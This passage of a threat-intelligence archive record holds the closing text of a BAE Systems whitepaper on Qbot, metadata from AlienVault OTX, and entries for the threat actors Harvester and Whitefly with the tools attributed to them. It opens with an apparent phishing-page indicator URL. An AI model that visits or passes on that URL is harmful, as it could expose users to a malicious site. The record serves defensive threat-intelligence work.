http://w1.plenimusic.com/fakes/onlineserv_cm_logoff.html\n\n\n-----\n\n### We are BAE Systems\n\nWe help nations, governments and businesses around **Global Headquarters**\nthe world defend themselves against cyber crime, **BAE Systems**\nreduce their risk in the connected world, comply with Surrey Research Park\nregulation, and transform their operations. Guildford\n\nSurrey GU2 7RQ\n\nWe do this using our unique set of solutions, systems, United Kingdom\nexperience and processes - often collecting and T: +44 (0) 1483 816000\nanalysing huge volumes of data. These, combined\nwith our cyber special forces - some of the most **BAE Systems**\nskilled people in the world, enable us to defend 265 Franklin Street\nagainst cyber attacks, fraud and financial crime, Boston\nenable intelligence-led policing and solve complex MA 02110\ndata problems. USA\n\nT: +1 (617) 737 4170\n\nWe employ over 4,000 people across 18 countries in\nthe Americas, APAC, UK and EMEA. **BAE Systems**\n\nLevel 12\n20 Bridge Street\nSydney NSW 2000\nAustralia\nT: +612 9240 4600\n\n**BAE Systems**\nArjaan Office Tower\nSuite 905\nPO Box 500523\nDubai, U.A.E\nT: +971 (0) 4 556 4700\n\n**BAE Systems**\n1 Raffles Place #23-03, Tower 1\nSingapore 048616\nSingapore\nT: +65 6499 5000\n\nVictim of a cyber attack? Contact our emergency\n\nBAE Systems, Surrey Research Park, Guildford\n\nresponse team on:\n\nSurrey, GU2 7RQ, UK\n\nE: learn@baesystems.com \u0007| W: baesystems.com/businessdefence\n\nUS: 1 (800) 417-2155\n\nlinkedin.com/company/baesystemsai UK: 0808 168 6647\n\nAustralia: 1800 825 411\n\ntwitter.com/baesystems_ai International: +44 1483 817491\n\nE: cyberresponse@baesystems.com\n\nCertified Service\n\nCyber Incident Response\n\nCopyright © BAE Systems plc 2016. All rights reserved.\n\nBAE SYSTEMS, the BAE SYSTEMS Logo and the product names referenced herein are trademarks of BAE Systems plc. BAE Systems Applied Intelligence Limited registered in England &\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5910e58f-4bc9-4e4e-9dbb-887804094a01",
            "created_at": "2022-10-25T16:32:58.457399Z",
            "updated_at": "2022-10-25T16:32:58.457399Z",
            "deleted_at": null,
            "name": "OTX",
            "url": "https://otx.alienvault.com",
            "description": "Alienvault Open Threat Exchange (OTX)",
            "reports": null
        }
    ],
    "references": [
        "http://info.ai.baesystems.com/rs/308-OXI-896/images/The_Return_of_Qbot_WP_V2%20Mar16%20hi%20FINAL.pdf"
    ],
    "report_names": [
        "The_Return_of_Qbot_WP_V2%20Mar16%20hi%20FINAL.pdf"
    ],
    "threat_actors": [
        {
            "id": "81dde5cc-c29f-430d-8c6e-e5e92d5015e7",
            "created_at": "2022-10-25T16:07:23.704358Z",
            "updated_at": "2025-03-27T02:02:09.932453Z",
            "deleted_at": null,
            "main_name": "Harvester",
            "aliases": [],
            "source_name": "ETDA:Harvester",
            "tools": [
                "Agentemis",
                "Cobalt Strike",
                "CobaltStrike",
                "Graphon",
                "Metasploit",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "df9bfbf1-bb9d-492f-b381-95b9e1482267",
            "created_at": "2022-10-25T16:07:24.394491Z",
            "updated_at": "2025-03-27T02:02:10.207352Z",
            "deleted_at": null,
            "main_name": "Whitefly",
            "aliases": [
                "ATK 83",
                "Bronze Walker",
                "Mofang",
                "SectorM04",
                "TEMP.Mimic"
            ],
            "source_name": "ETDA:Whitefly",
            "tools": [
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Mimikatz",
                "Nibatad",
                "Shim RAT",
                "ShimRAT",
                "Vcrodat"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716499,
    "ts_updated_at": 1743041303,
    "ts_creation_date": 1459944873,
    "ts_modification_date": 1460047796,
    "files": {
        "pdf": "https://archive.orkl.eu/0f813f0acc7498e2a4e91d1c59dbc0245f887c4e.pdf",
        "text": "https://archive.orkl.eu/0f813f0acc7498e2a4e91d1c59dbc0245f887c4e.txt",
        "img": "https://archive.orkl.eu/0f813f0acc7498e2a4e91d1c59dbc0245f887c4e.jpg"
    }
}